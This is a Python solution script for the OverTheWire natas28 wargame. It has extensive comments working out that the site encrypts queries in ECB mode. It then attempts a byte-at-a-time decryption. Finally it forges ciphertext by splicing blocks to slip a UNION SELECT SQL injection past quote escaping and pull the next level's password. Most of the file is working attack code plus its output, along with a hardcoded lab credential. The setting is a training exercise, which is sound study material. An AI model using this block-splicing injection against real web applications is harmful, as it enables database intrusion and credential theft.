import requests
import re
from urllib.parse import quote_from_bytes, unquote
from base64 import b64decode, b64encode

url = "http://natas28.natas.labs.overthewire.org/"
auth = ("natas28", "JWwR438wkgTsNKBbcJoowyysdM82YjeF")


def get_encrypted(query):
    r = requests.post(
        url,
        auth=auth,
        allow_redirects=False,
        data={"query": query},
    )

    url_encoded = re.search("query=(.*)", r.headers["Location"]).group(1)
    base64_encoded = unquote(url_encoded)
    return b64decode(base64_encoded).hex()


# 1) Analysis

# print(f"a   ", get_encrypted("a"))
# print(f"b   ", get_encrypted("b"))
# print(f"c   ", get_encrypted("c"))

# for i in range(2, 42):
#     print(f"# {i}a ", get_encrypted("a" * i))

# a    1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2 ab880a8f136fbeb98967891324a1b075 bdfa1054ec68515cf96f2a5544591947904f4b2abf2c2d7686aa72a53151c970
# b    1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2 188b036748963b28724653e5e3b8ccd5 bdfa1054ec68515cf96f2a5544591947904f4b2abf2c2d7686aa72a53151c970
# c    1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2 8431928d012cb4f6de68a133406da5f4 bdfa1054ec68515cf96f2a5544591947904f4b2abf2c2d7686aa72a53151c970
# >>>  => blocks of 32 hex = 128 bits

# 2a   1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2 b130a531bec89c705213bfa5c9667ac7 48799a07b1d29b5982015c9355c2e00e aded9bdbaca6a73b71b35a010d2c4c57
# 3a   1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2 2f5293a63acb9fe8c7b4e824b76d6a1d 9a2e2b5db6f31f19a14f75678eadaa90 4249b93e4dea0909479995b9c44b351a
# 4a   1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2 3504a9a9675ffd614b4f1f90d284fcaa 29287f3cc5479e12e66f31c863b18047 56d5732dc8c770f64397158bc17a6e66
# 5a   1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2 c36a1f0469158a3052166146a5e3f2ec ac3b871c1c448386b45cd36d9e8f72f4 655149bbba2123d89d95417ea27f3a7b
# 6a   1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2 4a11ffe73afd15daa05eb3c3486dcde1 41c098c4bacdc5ed9357564e5105dd7e 64d0dcc868253692adfcbd3796d1bf8a
# 7a   1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2 9fde1cef6e3f84a172633f3074fc8e18 6486954aea46fb93e9ab85845b4f4bd0 d7ff2b725453fc294701e51f5d7c0f8e
# 8a   1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2 453e0020602f4dccd50f0eb7709477c2 896de90884f86108b167f8b4aea5d763 917232051483e68e458fd066167b30a3
# 9a   1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2 9e622686a52640595706099abcb052bb a09522f301cf9d36ac7023f165948c5a 9739cd90522fa7a86f95773b56f9f8c0
# 10a  1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2 c0872dee8bc90b1156913b08a223a39e 738a5ffb4a4500246775175ae596bbd6 f34df339c69edce11f6650bbced62702
# >>>    3rd block does not change anymore afterwards => the 10 "a" are the last chars of this block
# >>>    since there are 16 chars per block (cf. below), there are 6 chars before the query in this block (and therefore 2*16 + 6 = 38 chars in the full message)
# 11a  1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39e b4eda087d3c0bea2bedc1b6140b9e2eb ca8cf4e610913abae39a067619204a5a
# 12a  1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39e ce82a9553b65b81280fb6d3bf2900f47 75fd5044fd063d26f6bb7f734b41c899
# >>>    last block is full (since we get a new one below) ; as we now have 2 "a" in the 4th block, there are 14 + 16 = 30 chars after the query

# > new block at the end
# 13a  1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39e 1f74714d76fcc5d464c6a221e6ed98e4 6223a14d9c4291b98775b03fbc73d4ed d8ae51d7da71b2b083d919a0d7b88b98
# 14a  1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39e ecd36f8fd9164d403540e449707d27e5 4257a343daadaaf2c0e3a1d71ce03dd1 7b7baca655f298a321e90e3f7a60d4d8
# 15a  1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39e 5aef2a997da2363f72a3fad332d1736f a773f3185094aa01408f1f97d037d385 678c5773ecc28f870e4f4ebc6c8070a4
# 16a  1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39e 8925158cfc5ac06d22bfda0b72c8f151 a77e8ed1aabe0b5d05c4ffe6ac1423ab 478eb1a1fe261a2c6c15061109b3feda
# >>>    starting below, you can see that the last 2 blocks are the same as the queries with 16 less characters => this is a block cipher in ECB mode, with 16 chars per block
# 17a  1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39e adf8a1ad0177ed1ecad3ac7c1082aa9e bdfa1054ec68515cf96f2a5544591947 904f4b2abf2c2d7686aa72a53151c970
# 18a  1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39e 53d9499ebcad6861f04b7cdc24f30462 48799a07b1d29b5982015c9355c2e00e aded9bdbaca6a73b71b35a010d2c4c57
# 19a  1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39e a549fda52b6d9b4e2632db31838856d5 9a2e2b5db6f31f19a14f75678eadaa90 4249b93e4dea0909479995b9c44b351a
# 20a  1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39e 2011bbe488dde1bbec961b6170b30e12 29287f3cc5479e12e66f31c863b18047 56d5732dc8c770f64397158bc17a6e66
# 21a  1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39e 8829a1f930ceb566b834441c0577402c ac3b871c1c448386b45cd36d9e8f72f4 655149bbba2123d89d95417ea27f3a7b
# 22a  1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39e 547602b52fae1566ac8e971f91f6d605 41c098c4bacdc5ed9357564e5105dd7e 64d0dcc868253692adfcbd3796d1bf8a
# 23a  1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39e a45a93ee4794d1b6204fb0920b68f27d 6486954aea46fb93e9ab85845b4f4bd0 d7ff2b725453fc294701e51f5d7c0f8e
# 24a  1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39e eda118f999f9495e8f3d973fba6528a3 896de90884f86108b167f8b4aea5d763 917232051483e68e458fd066167b30a3
# 25a  1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39e f2909c4d53781ee1777a012bb1a72541 a09522f301cf9d36ac7023f165948c5a 9739cd90522fa7a86f95773b56f9f8c0
# 26a  1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39e b39038c28df79b65d26151df58f7eaa3 738a5ffb4a4500246775175ae596bbd6 f34df339c69edce11f6650bbced62702
# >    as expected (26 = 10 + 16), 4th block does not change anymore from here on
# 27a  1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39eb39038c28df79b65d26151df58f7eaa3 b4eda087d3c0bea2bedc1b6140b9e2e bca8cf4e610913abae39a067619204a5a
# 28a  1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39eb39038c28df79b65d26151df58f7eaa3 ce82a9553b65b81280fb6d3bf2900f4 775fd5044fd063d26f6bb7f734b41c899

# > new block again at the end => 29 - 13 = 16 chars per block, as seen above
# 29a  1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2c0872dee8bc90b1156913b08a223a39eb39038c28df79b65d26151df58f7eaa3 1f74714d76fcc5d464c6a221e6ed98e4 6223a14d9c4291b98775b03fbc73d4ed d8ae51d7da71b2b083d919a0d7b88b98
# ...


# 2) Let's try to break the code

# It's impossible to decrypt the first 2*16 chars (need to bruteforce #possible_chars^16 combinations), hard to guess the 6 before the query (need to bruteforce #possible_chars^6 combinations),
# however it should be possible to decrypt the last 30 chars, with the following strategy (we'll call ?1-?30 the unknown chars):
# - generate the encryption of string f'aaaaaaaaaaaaaaa{?1}', which can be done by sending query1 = "a" * (16 * m + 9) and extracting the (m + 3)th block
# - generate for each character c the encryption of string f'aaaaaaaaaaaaaaa{c}', which can be done by sending query2 = query2_prefix + c, with query2_prefix = "a" * (16 * n + 9),
#   and extracting the (n + 3)th block; if it matches the encryption above, ?1 = c
# - repeat with
#     f'aaaaaaaaaaaaaa{?1}{?2}' => query1 = query1[:-1]
#   and
#     f'aaaaaaaaaaaaaa{?1}{c}' => query2_prefix = query2_prefix[1:] + ?1
# - and so on...
# Note that, while n just needs to be >= 1, m has to be high enough so that all 30 chars can fit in the (m + 3)th block;
# since we have 30+38 fixed chars, we need (m + 3) * 16 >= 68, i.e. m >= 2
# If you like to visualize, here is the last query for m=2:
# ................ ................ ......aaaaaaaaaa aa?????????????? ????????????????
#                                     38 ^


def get_nth_encrypted_block(encrypted, n):
    """
    Beware, n starts at 1 =)
    """
    return encrypted[(n - 1) * 32 : n * 32]


last_chars = ""

m = 2
query1 = "a" * (16 * m + 9)
n = 1
query2_prefix = query2 = "a" * (16 * n + 9)
for loop in range(32):
    encrypted = get_encrypted(query1)
    ref_encrypted_block = get_nth_encrypted_block(encrypted, m + 3)

    print(f"query2: '{query2_prefix}?'")
    next_char = None
    for i in range(128):
        c = chr(i)

        encrypted = get_encrypted(query2_prefix + c)
        encrypted_block = get_nth_encrypted_block(encrypted, n + 3)

        if encrypted_block == ref_encrypted_block:
            next_char = c
            break
    if next_char is None:
        print("fail")
        break

    last_chars += next_char
    print(last_chars)

    query1 = query1[:-1]
    query2_prefix = query2_prefix[1:] + next_char

# ... aaand it does not work after the first char ; why?
# we do guess first char '%' correctly, which hints at an SQL query like:
#
# SELECT joke FROM jokes_tables WHERE joke LIKE '%<input>%';
#
# which would make the next character ' or "
# but when we submit one of those characters in the query, it is actually escaped with a backslash:

ref_query = "a" * 10  # fill 3rd block with "a"
encrypted = get_encrypted(ref_query)
# print(get_nth_encrypted_block(encrypted, 3), get_nth_encrypted_block(encrypted, 4))

# c0872dee8bc90b1156913b08a223a39e 738a5ffb4a4500246775175ae596bbd6

ref_query = "a" * 9 + "b"  # same length
encrypted = get_encrypted(ref_query)
# print(get_nth_encrypted_block(encrypted, 3), get_nth_encrypted_block(encrypted, 4))

# 823cc999bdbcd093d342f8940069fc00 738a5ffb4a4500246775175ae596bbd6   as expected, 4th block does not change

quote_query = "a" * 9 + "'"
encrypted = get_encrypted(quote_query)
# print(get_nth_encrypted_block(encrypted, 3), get_nth_encrypted_block(encrypted, 4))

# 11dbb80ae02425dc9726bffd1803160e b2d7646f009291b8d9cc947516ba339d   \' instead of ' => \ goes in the 3rd block, ' in the 4th which is thus changed

double_quote_query = "a" * 9 + '"'
encrypted = get_encrypted(double_quote_query)
# print(get_nth_encrypted_block(encrypted, 3), get_nth_encrypted_block(encrypted, 4))

# 11dbb80ae02425dc9726bffd1803160e 7b4bb31504d0c93245e6e3d42b723c80   \ in the 3rd (=> same block as above), " in the 4th

backslash_query = "a" * 9 + "\\"
encrypted = get_encrypted(backslash_query)
# print(get_nth_encrypted_block(encrypted, 3), get_nth_encrypted_block(encrypted, 4))

# 11dbb80ae02425dc9726bffd1803160e 7cde70a0a8529108e56348397954989d   \ in the 3rd, \ in the 4th

# Fortunately, now that we know we need to inject SQL, we don't need to break the code, just inject a query smartly =)
# Let's try some more chars that we'll need:

hash_query = "a" * 9 + "#"
encrypted = get_encrypted(hash_query)
# print(get_nth_encrypted_block(encrypted, 3), get_nth_encrypted_block(encrypted, 4))

# dcba92e5d59b178a7980f51e92e856db 738a5ffb4a4500246775175ae596bbd6   fine

semicolon_query = "a" * 9 + ";"
encrypted = get_encrypted(semicolon_query)
# print(get_nth_encrypted_block(encrypted, 3), get_nth_encrypted_block(encrypted, 4))

# b4afa22aa3000721497ccd831f455f14 738a5ffb4a4500246775175ae596bbd6   fine


# 3) Injection

# Idea is to inject the escaped characters as the last characters of a block, so that the \ takes their place and they
# end up as the first character of the next block ; we'll then simply override the block that contains the \ to remove it.
#
# Here is the query we want to inject:
#
# <stuff>' UNION SELECT password FROM users WHERE username='natas29';#
#
# and here's the one we send (p for plain):

p1 = "aaaaaaaaa'"  # (only 10 chars here to complete 3rd block)
p2 = "UNION SELECT pa"  # (only 15 chars here because ' will be in the same block)
p3 = "ssword FROM user"
p4 = "s WHERE         "  # (blanks here to align next ')
p5 = "      username='"
p6 = "natas29        "  # (this works thanks to MySQL ignoring trailing blanks in equality)
p7 = "               '"
p8 = ";#"

query = p1 + p2 + p3 + p4 + p5 + p6 + p7 + p8
encrypted = get_encrypted(query)
# print(encrypted)

# result (e for encrypted):
pre = "1be82511a7ba5bfd578c0eef466db59cdc84728fdcf89d93751d10a7c75c8cf2"
e1 = "11dbb80ae02425dc9726bffd1803160e"  # to override
e2 = "63b4af115824b5ed9da67b04c7deffed"
e3 = "043003a0d0e6d1e3c6e068f0ce764453"
e4 = "ae24bfd250851a90e154323cfc52e82a"
e5 = "37a36964d09f60d2a7581da256c0bd2f"  # to override
e6 = "614efe3c2543358980caa7b570718303"
e7 = "e9bd8b96a492d67205bb71e318e3b58b"  # to override
e8 = "0e74a8bf29aee6cebba119fe2d40ec01"
post = "6223a14d9c4291b98775b03fbc73d4edd8ae51d7da71b2b083d919a0d7b88b98"

# (o for) override:
op1 = "aaaaaaaaaa"
encrypted = get_encrypted(op1)
oe1 = get_nth_encrypted_block(encrypted, 3)

op5 = "       username="
encrypted = get_encrypted(op1 + op5)
oe5 = get_nth_encrypted_block(encrypted, 4)

op7 = "                "
encrypted = get_encrypted(op1 + op7)
oe7 = get_nth_encrypted_block(encrypted, 4)

# final query
pwn_query = pre + oe1 + e2 + e3 + e4 + oe5 + e6 + oe7 + e8 + post

r = requests.post(
    url + "search.php/",
    auth=auth,
    params={"query": b64encode(bytes.fromhex(pwn_query))},
)

print(r.content.decode())
